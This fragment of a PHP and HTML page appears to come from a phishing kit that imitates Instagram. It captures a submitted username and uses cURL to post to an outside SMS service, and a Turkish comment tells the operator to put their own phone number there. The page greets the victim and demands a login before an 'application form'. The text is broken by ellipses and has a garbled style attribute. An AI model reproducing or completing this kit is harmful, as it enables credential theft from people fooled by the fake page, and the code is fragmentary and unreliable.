...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'txt_gsmno=5511812725'); //BURAYA NUMARANIZI YAZIN 0 OLMADAN YAZICAKSINIZ
$result = curl_exec($ch);
$user=$_POST["user"];
...
background-color: rgba(var(--d69,0,149,246),1);
	...
	<center>
		...
		<!--	<center>
			...
			<br><p style="font-family:sans-serif; folorexresimnt-size:15px; color: #999; line-height:20px; font-weight:400;">
				Hello, <?php echo $lorex; ?>&nbsp;<img style="width:19px;height: 19px;" src="https://i.hizliresim.com/ri9649z.png"> <br>You must log in before going to the<br>
				application form.
				<br>
			</p><center>    
				<div class="Et89U">
